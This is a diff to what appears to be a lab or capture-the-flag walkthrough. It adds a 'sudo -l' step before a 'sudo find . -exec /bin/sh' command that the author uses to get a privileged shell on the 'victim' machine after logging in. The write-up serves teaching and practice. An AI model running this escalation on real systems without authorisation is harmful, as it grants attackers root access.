@@ -61,6 +61,7 @@ We have identified credentials that we can use to login to the victim with via s
 I will now perform the commands below and look at the accounts sudo permissions,
 then execute the second command below to gain access to a privileged shell:
 
+<pre><code>sudo -l</code></pre>
 <pre><code>sudo find . -exec /bin/sh \; -quit</code></pre>
 
 ![alttxt](Pictures/sigma_privesc.png)
